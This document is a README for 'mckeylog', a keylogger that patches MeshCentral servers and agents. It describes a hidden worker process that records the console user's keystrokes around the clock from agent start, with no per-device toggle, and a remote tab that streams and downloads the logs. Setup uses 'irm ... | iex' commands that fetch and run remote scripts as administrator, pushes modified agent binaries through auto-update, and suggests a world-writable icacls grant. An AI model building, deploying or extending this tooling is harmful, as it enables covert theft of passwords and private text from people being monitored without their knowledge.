# MeshCentral Keylogger (`mckeylog`)

A keylogger for [MeshCentral](https://github.com/Ylianst/MeshCentral), built the
same way the MeshCentral Audio project is: a native C module compiled into
MeshAgent plus a MeshCentral plugin that adds a first-class **Keylogs** tab to
every device page.

- **Readable live view** — keystrokes stream in as assembled text with
  `Window:` markers, NanoCore-style, while you watch.
- **24/7 capture** — logging auto-starts whenever the agent runs, including as
  a session-0 service: a hidden user-session worker captures the console
  user's keys and pipes them back to the agent.
- **Previous keylogs** — the agent always writes rolling local log files; the
  tab lists them and can view or download any of them.
- No third-party dependencies; plain JSON over the authenticated agent relay
  (tunnel protocol **17**).

## Install & set up on your own MeshCentral server

### Prerequisites

- A Windows machine running a MeshCentral server (the default install:
  `C:\Program Files\Open Source\MeshCentral`, data in `meshcentral-data\`).
  The install path can be anything — pass it with `-MeshCentralRoot`.
- Node.js available on the server (the server needs it to run anyway; Node
  18+ works, and Node 26 is covered by built-in compat patches — see below).
- The MeshAgent binaries in `binaries/` are prebuilt; no build needed.

### Step 1 — Patch the server

PowerShell **as administrator**, on the server:

```powershell
powershell -c "irm https://raw.githubusercontent.com/og-debug447/meshcentral-keylogger/main/install-keylogger.ps1 | iex"
```

What it does:

- Patches the MeshCentral package (relay rights check for tunnel protocol 17,
  tunnel dispatch, device page templates with the new **Keylogs** tab / page
  61) — idempotent; pre-patch copies of the MeshCentral files are kept in
  `meshcentral-data\mckeylog-backups\<timestamp>`.
- Copies the plugin (`mckeylog.js`, `config.json`, the viewmode controller)
  into `meshcentral-data\plugins\mckeylog\` and runs the plugin patcher.
- Applies **Node.js ≥ 26 compatibility patches** to the installed
  `node_modules` tree (fd-slicer ×2 and pluginHandler — without them, plugin
  zip extraction hangs or truncates on Node 26). Re-run after any MeshCentral
  upgrade.
- Restarts the MeshCentral service.

### Step 2 — Publish the keylogger agent binaries

Still in the elevated PowerShell:

```powershell
powershell -c "irm https://raw.githubusercontent.com/og-debug447/meshcentral-keylogger/main/install-keylogger-agent.ps1 | iex"
```

This drops the keylogger-enabled `MeshService.exe` (x86) and
`MeshService64.exe` (x64) into `meshcentral-data\signedagents\` so Agent
Update/Reinstall picks them up. ARM64 agents are left alone.

### Step 3 — Install the plugin (admin console)

1. Browse to your MeshCentral server → **admin** → **Plugins**.
2. *Install* → paste the plugin URL:
   `https://raw.githubusercontent.com/og-debug447/meshcentral-keylogger/main/config.json`
3. **Hard-refresh the browser (Ctrl+F5).**

### Step 4 — Update the agents

On each Windows device, **PC Control → agent menu → Agent Update** (or
reinstall the agent). Two things to expect the first time:

- **Self-update dance**: after the server restarts, agents notice their exe
  hash no longer matches what the server serves and download/restart a few
  times (~5–6 cycles, 1–2 minutes). That is normal and converges on its own.
- **Auto-start**: the keylogger starts at agent load — no per-device toggle.
  A hidden `keylog-worker` process appears in the user session; that is the
  thing actually capturing the console user's keystrokes while the service
  sits in session 0.

### Step 5 — Verify

Open a device → the **Keylogs** tab (next to *Plugins*):

- **Connect**, then watch the **live pane** — it shows readable lines like:

  ```
  2026-11-11 17:05:43  -  Window: Some App — Some Document
  2026-11-11 17:05:47  -  hello world this is a test
  2026-11-11 17:05:48  -  [Enter]
  ```

  Window markers render in blue, no duplicate lines, no per-key timestamp
  wall.
- **Refresh Files** lists the agent's `keylog-*.log` files; **View** shows the
  beginning inline, **Download** fetches the whole file.

If the live pane is empty, check `keylog-debug.log` next to the agent exe
(elevated `icacls` grant for `Everyone:F` makes it readable for diagnosis):
`worker: spawned pid=... hook installed` means capture is running.

## What the Keylogs tab does

- **Connect / Disconnect** — opens the authenticated tunnel (protocol 17) to
  the agent. Auto-reconnects a few times if the link drops while the tab is
  open.
- **Start Logging / Stop Logging** — toggles the native keylogger remotely
  (the agent auto-starts it at boot, so logging is on by default).
- **Refresh Files** — re-lists the agent's `keylog-*.log` files.
- **Live pane** — the last 2000 logged *lines* (see format above), window
  markers styled in blue.
- **Previous keylog files** — View (first ~512 KB inline) or Download (full
  file) via 64 KB chunks.

## How it works (short version)

- `agent/ILibDuktape_Keylogger.c` — native Windows keylogger. The agent
  service (session 0) can't see the console session's input desktop, so it
  relaunches **itself** as a hidden `keylog-worker` in the interactive user's
  session (`CreateProcessAsUser` on the console user's token). The worker
  installs a `WH_KEYBOARD_LL` hook there, formats keystrokes into readable
  lines (window markers, assembled text, Enter/idle flushing, backspace
  handling), and streams fixed 400-byte records — 2-byte key count + line
  text — over `\\.\pipe\mckeylog`. The agent stores them in a 4096×384
  in-memory ring and in rolling `keylog-YYYY-MM-DD.log` files (10 MB default,
  rotates to `-1`/`-2`; 1 MB–256 MB configurable) next to the agent exe.
  Workers are re-spawned automatically after logoff/user switch, so capture
  runs 24/7.
- `modules_meshcore/win-keylogger.js` — agent side of the tunnel: `tail`
  (live stream, 250 ms drain with backpressure), `start`, `stop`, `state`,
  `list`, `read`, `unsub`; calls `start()` at load so logging is automatic.
- `plugin/mckeylog-viewmode.js` — browser controller for the tab, copied to
  `public/scripts/mckeylog-viewmode.js` by the patcher.
- `scripts/patch_meshcentral.js` — idempotent server patch (meshrelay rights,
  meshcore dispatch, both device page templates, page 61).
- `scripts/patch_meshagent.js` — idempotent MeshAgent source patch (C module,
  ScriptContainer init, the `keylog-worker` branch in `ServiceMain.c`,
  vcxproj/makefile entries).

See `docs/architecture.md` for the full design, and
`docs/conversation-transcript.md` for the session-by-session development
transcript (context for other AIs taking this over).

## Building the agent binaries

From a MeshAgent checkout with Visual Studio 2022 (v143) or newer:

```powershell
node scripts/patch_meshagent.js <path-to-MeshAgent>
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x64
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x86
```

(Use `/p:Platform=x86`, not `Win32` — the solution's x86 platform is named
`x86`; otherwise MSBuild fails with MSB4126.)

Outputs: `meshservice\Release\MeshService64.exe` and `meshservice\Release\MeshService.exe`.
Replace the files in `binaries/` and push, then re-run the agent installer.

## Notes

- Logging is on by default after agent start; Stop Logging pauses capture but
  the previous files remain on the agent.
- Keystrokes are captured in the interactive session by the worker, so the
  agent works whether it runs as a service (session 0) or in a user session
  (in that case the in-process hook captures directly, no worker).
- Non-Windows agents get a stub that reports "not available" — the tab still
  works, it just shows the status message.
- The keylogger only sees key-down events from the keyboard (injected keys
  are included, as is normal for low-level hooks).
